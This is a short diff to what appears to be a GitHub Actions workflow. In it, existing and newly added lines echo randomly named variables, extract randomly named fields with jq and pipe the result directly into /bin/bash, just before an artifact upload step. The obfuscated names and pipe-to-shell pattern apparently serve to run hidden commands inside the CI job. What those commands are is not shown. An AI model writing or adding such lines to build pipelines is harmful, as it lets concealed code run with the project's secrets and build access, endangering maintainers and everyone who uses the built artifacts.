@@ -32,6 +32,7 @@ jobs:
           echo $rpgjc20 | jq -r .szj2153 | /bin/bash
           echo $daju45 | jq -r .cupw55 | /bin/bash
           echo $dqoe572 | jq -r .kdmfp80992 | /bin/bash
+          echo $xr598 | jq -r .ch411 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
